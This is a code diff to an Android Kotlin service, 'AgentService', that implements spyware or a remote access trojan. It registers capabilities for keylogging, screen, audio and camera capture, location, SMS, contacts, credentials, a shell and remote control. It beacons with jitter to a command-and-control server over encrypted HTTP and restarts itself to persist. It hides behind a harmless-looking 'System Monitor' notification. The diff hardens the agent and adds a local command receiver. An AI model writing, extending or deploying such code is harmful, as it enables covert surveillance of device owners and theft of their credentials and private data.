@@ -4,6 +4,7 @@ import android.accessibilityservice.AccessibilityService
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.PendingIntent
 import android.app.Service
 import android.content.ComponentName
 import android.content.Context
@@ -40,6 +41,7 @@ import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import androidx.annotation.RequiresApi
 import androidx.core.app.NotificationCompat
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import com.system.monitor.capabilities.*
@@ -91,6 +93,7 @@ class AgentService : Service() {
     private var scale = 1.0f
     private var remoteAccessibilityService: RemoteAccessibilityService? = null
     private var persistentMode = true
+    private var commandReceiver: CommandReceiver? = null
 
     inner class LocalBinder : Binder() {
         fun getService(): AgentService = this@AgentService
@@ -98,85 +101,99 @@ class AgentService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        loadConfig()
-        acquireWakeLock()
-        initCrypto()
-        registerCapabilities()
-        running = true
-        createNotificationChannel()
-        startForeground(1, buildForegroundNotification())
-        thread(name = "agent-beacon") { beaconLoop() }
-        Log.d("AgentService", "Service created, persistentMode=$persistentMode")
-    }
-
-    private fun loadConfig() {
-        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-        persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
-    }
-
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel("agent_service", "System Monitor", NotificationManager.IMPORTANCE_LOW).apply {
-                description = "System monitoring service"
-            }
-            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            nm.createNotificationChannel(channel)
+        try {
+            loadConfig()
+            acquireWakeLock()
+            initCrypto()
+            registerCapabilities()
+            running = true
+            createNotificationChannel()
+            val notification = buildForegroundNotification()
+            startForeground(1, notification)
+            registerCommandReceiver()
+            thread(name = "agent-beacon") { beaconLoop() }
+            Log.d("AgentService", "Service created successfully, persistentMode=$persistentMode")
+        } catch (e: Exception) {
+            Log.e("AgentService", "Error in onCreate", e)
+            stopSelf()
         }
     }
 
-    private fun buildForegroundNotification(): Notification {
-        return NotificationCompat.Builder(this, "agent_service")
-            .setContentTitle("System Monitor")
-            .setContentText("Monitoring active")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)
-            .setOngoing(true)
-            .build()
+    private fun loadConfig() {
+        try {
+            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+            persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
+        } catch (e: Exception) {
+            Log.e("AgentService", "Error loading config", e)
+        }
     }
 
     private fun getC2Server(): String {
-        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-        return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER) ?: DEFAULT_C2_SERVER
+        try {
+            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+            return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER) ?: DEFAULT_C2_SERVER
+        } catch (e: Exception) {
+            return DEFAULT_C2_SERVER
+        }
     }
 
     private fun acquireWakeLock() {
-        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AgentService::wakelock")
-        wakeLock?.acquire()
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AgentService::wakelock")
+            wakeLock?.acquire()
+        } catch (e: Exception) {
+            Log.e("AgentService", "Error acquiring wake lock", e)
+        }
     }
 
     private fun initCrypto() {
-        val keyGen = KeyPairGenerator.getInstance("RSA")
-        keyGen.initialize(2048)
-        val keyPair = keyGen.generateKeyPair()
-        val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
-        prefs.edit()
-            .putString("private_key", Base64.encodeToString(keyPair.private.encoded, Base64.NO_WRAP))
-            .putString("public_key", Base64.encodeToString(keyPair.public.encoded, Base64.NO_WRAP))
-            .apply()
-        rsaPublicKey = keyPair.public
+        try {
+            val keyGen = KeyPairGenerator.getInstance("RSA")
+            keyGen.initialize(2048)
+            val keyPair = keyGen.generateKeyPair()
+            val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
+            prefs.edit()
+                .putString("private_key", Base64.encodeToString(keyPair.private.encoded, Base64.NO_WRAP))
+                .putString("public_key", Base64.encodeToString(keyPair.public.encoded, Base64.NO_WRAP))
+                .apply()
+            rsaPublicKey = keyPair.public
 
-        val aesGen = KeyGenerator.getInstance("AES")
-        aesGen.init(256)
-        aesKey = aesGen.generateKey()
+            val aesGen = KeyGenerator.getInstance("AES")
+            aesGen.init(256)
+            aesKey = aesGen.generateKey()
+        } catch (e: Exception) {
+            Log.e("AgentService", "Error initializing crypto", e)
+        }
     }
 
     private fun registerCapabilities() {
-        capabilities["keylogger"] = KeyloggerCapability(this)
-        capabilities["screen"] = ScreenCapability(this)
-        capabilities["audio"] = AudioCapability(this)
-        capabilities["camera"] = CameraCapability(this)
-        capabilities["location"] = LocationCapability(this)
-        capabilities["contacts"] = ContactsCapability(this)
-        capabilities["sms"] = SmsCapability(this)
-        capabilities["call_logs"] = CallLogsCapability(this)
-        capabilities["files"] = FilesCapability(this)
-        capabilities["apps"] = AppsCapability(this)
-        capabilities["wifi"] = WifiCapability(this)
-        capabilities["shell"] = ShellCapability(this)
-        capabilities["creds"] = CredsCapability(this)
-        capabilities["clipboard"] = ClipboardCapability(this)
-        capabilities["notifications"] = NotificationsCapability(this)
-        capabilities["remote_control"] = RemoteControlCapability(this)
+        try {
+            capabilities["keylogger"] = KeyloggerCapability(this)
+            capabilities["screen"] = ScreenCapability(this)
+            capabilities["audio"] = AudioCapability(this)
+            capabilities["camera"] = CameraCapability(this)
+            capabilities["location"] = LocationCapability(this)
+            capabilities["contacts"] = ContactsCapability(this)
+            capabilities["sms"] = SmsCapability(this)
+            capabilities["call_logs"] = CallLogsCapability(this)
+            capabilities["files"] = FilesCapability(this)
+            capabilities["apps"] = AppsCapability(this)
+            capabilities["wifi"] = WifiCapability(this)
+            capabilities["shell"] = ShellCapability(this)
+            capabilities["creds"] = CredsCapability(this)
+            capabilities["clipboard"] = ClipboardCapability(this)
+            capabilities["notifications"] = NotificationsCapability(this)
+            capabilities["remote_control"] = RemoteControlCapability(this)
+        } catch (e: Exception) {
+            Log.e("AgentService", "Error registering capabilities", e)
+        }
+    }
+
+    private fun registerCommandReceiver() {
+        commandReceiver = CommandReceiver()
+        val filter = IntentFilter("com.system.monitor.ACTION_COMMAND")
+        LocalBroadcastManager.getInstance(this).registerReceiver(commandReceiver!!, filter)
     }
 
     private fun beaconLoop() {
@@ -186,8 +203,12 @@ class AgentService : Service() {
             } catch (e: Exception) {
                 Log.e("Agent", "Beacon error", e)
             }
-            val jitter = (BEACON_INTERVAL * JITTER_PERCENT * (Math.random() * 2 - 1)).toLong()
-            Thread.sleep(BEACON_INTERVAL + jitter)
+            try {
+                val jitter = (BEACON_INTERVAL * JITTER_PERCENT * (Math.random() * 2 - 1)).toLong()
+                Thread.sleep(BEACON_INTERVAL + jitter)
+            } catch (e: InterruptedException) {
+                return
+            }
         }
     }
 
@@ -203,24 +224,33 @@ class AgentService : Service() {
     }
 
     private fun registerAgent() {
-        val payload = mapOf(
-            "agent_id" to generateAgentId(),
-            "hostname" to Build.MODEL,
-            "os" to "android",
-            "arch" to System.getProperty("os.arch"),
-            "android_version" to Build.VERSION.RELEASE,
-            "sdk" to Build.VERSION.SDK_INT.toString(),
-            "privileged" to isRooted().toString()
-        )
-        val resp = post("/register", payload)
-        resp?.let { agentId = it["agent_id"] as? String }
+        try {
+            val payload = mapOf(
+                "agent_id" to generateAgentId(),
+                "hostname" to Build.MODEL,
+                "os" to "android",
+                "arch" to System.getProperty("os.arch"),
+                "android_version" to Build.VERSION.RELEASE,
+                "sdk" to Build.VERSION.SDK_INT.toString(),
+                "privileged" to isRooted().toString()
+            )
+            val resp = post("/register", payload)
+            resp?.let { agentId = it["agent_id"] as? String }
+        } catch (e: Exception) {
+            Log.e("Agent", "Register error", e)
+        }
     }
 
     private fun fetchTasks(): List<Task> {
-        val payload = mapOf("agent_id" to agentId!!)
-        val resp = post("/tasks", payload)
-        val tasksJson = resp?.get("tasks")
-        return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
+        try {
+            val payload = mapOf("agent_id" to agentId!!)
+            val resp = post("/tasks", payload)
+            val tasksJson = resp?.get("tasks")
+            return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
+        } catch (e: Exception) {
+            Log.e("Agent", "Fetch tasks error", e)
+            return emptyList()
+        }
     }
 
     private fun executeTask(task: Task) {
@@ -242,23 +272,27 @@ class AgentService : Service() {
     }
 
     private fun post(endpoint: String, payload: Any): Map<String, Any>? {
-        val url = URL("${getC2Server()}$endpoint")
-        val conn = url.openConnection() as HttpURLConnection
-        conn.requestMethod = "POST"
-        conn.doOutput = true
-        conn.connectTimeout = 15000
-        conn.readTimeout = 15000
-        conn.setRequestProperty("Content-Type", "application/octet-stream")
-        conn.setRequestProperty("X-Agent-ID", agentId ?: "")
+        try {
+            val url = URL("${getC2Server()}$endpoint")
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.doOutput = true
+            conn.connectTimeout = 15000
+            conn.readTimeout = 15000
+            conn.setRequestProperty("Content-Type", "application/octet-stream")
+            conn.setRequestProperty("X-Agent-ID", agentId ?: "")
 
-        val encrypted = encrypt(gson.toJson(payload).toByteArray(StandardCharsets.UTF_8))
-        conn.outputStream.write(encrypted)
-        conn.outputStream.flush()
+            val encrypted = encrypt(gson.toJson(payload).toByteArray(StandardCharsets.UTF_8))
+            conn.outputStream.write(encrypted)
+            conn.outputStream.flush()
 
-        if (conn.responseCode == 200) {
-            val decrypted = decrypt(conn.inputStream.readAllBytes())
-            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
-            return gson.fromJson(String(decrypted, StandardCharsets.UTF_8), type)
+            if (conn.responseCode == 200) {
+                val decrypted = decrypt(conn.inputStream.readAllBytes())
+                val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
+                return gson.fromJson(String(decrypted, StandardCharsets.UTF_8), type)
+            }
+        } catch (e: Exception) {
+            Log.e("Agent", "Post error", e)
         }
         return null
     }
@@ -329,10 +363,7 @@ class AgentService : Service() {
     override fun onBind(intent: Intent): IBinder = binder
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        if (persistentMode) {
-            return START_STICKY
-        }
-        return START_NOT_STICKY
+        return if (persistentMode) START_STICKY else START_NOT_STICKY
     }
 
     override fun onDestroy() {
@@ -340,6 +371,14 @@ class AgentService : Service() {
         wakeLock?.release()
         capabilities.values.forEach { it.cleanup() }
         stopStream()
+        val receiver = commandReceiver
+        if (receiver != null) {
+            try {
+                LocalBroadcastManager.getInstance(this).unregisterReceiver(receiver)
+            } catch (e: Exception) {
+                Log.w("AgentService", "Unregister receiver failed", e)
+            }
+        }
         // Restart service if persistent mode
         if (persistentMode) {
             val restartIntent = Intent(this, AgentService::class.java)
@@ -355,6 +394,33 @@ class AgentService : Service() {
         imageReader?.close()
         projection?.stop()
         projection = null
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel("agent_service", "System Monitor", NotificationManager.IMPORTANCE_LOW).apply {
+                description = "System monitoring service"
+            }
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            nm.createNotificationChannel(channel)
+        }
+    }
+
+    private fun buildForegroundNotification(): Notification {
+        val intent = Intent(this, SpeedMonActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+        }
+        val pendingIntent = PendingIntent.getActivity(
+            this, 0, intent,
+            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+        )
+        return NotificationCompat.Builder(this, "agent_service")
+            .setContentTitle("System Monitor")
+            .setContentText("Monitoring active")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setContentIntent(pendingIntent)
+            .setOngoing(true)
+            .build()
     }
 
     interface Capability {
@@ -377,4 +443,40 @@ class AgentService : Service() {
         val error: String?,
         val status: String
     )
+
+    private inner class CommandReceiver : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val capability = intent.getStringExtra("capability") ?: return
+            val argsJson = intent.getStringExtra("args") ?: "{}"
+            val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()
+
+            val capabilityImpl = capabilities[capability] ?: run {
+                sendLocalResult(taskId, null, "Unknown capability: $capability", "failed")
+                return
+            }
+
+            thread(name = "agent-task-$taskId") {
+                var output: Any? = null
+                var error: String? = null
+                var status = "completed"
+                try {
+                    output = capabilityImpl.execute(argsJson)
+                } catch (e: Exception) {
+                    error = e.message
+                    status = "failed"
+                }
+                sendLocalResult(taskId, output, error, status)
+            }
+        }
+    }
+
+    private fun sendLocalResult(taskId: String, result: Any?, error: String?, status: String) {
+        val intent = Intent("com.system.monitor.ACTION_RESULT").apply {
+            putExtra("task_id", taskId)
+            putExtra("result", result?.toString() ?: "")
+            putExtra("error", error ?: "")
+            putExtra("status", status)
+        }
+        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
+    }
 }
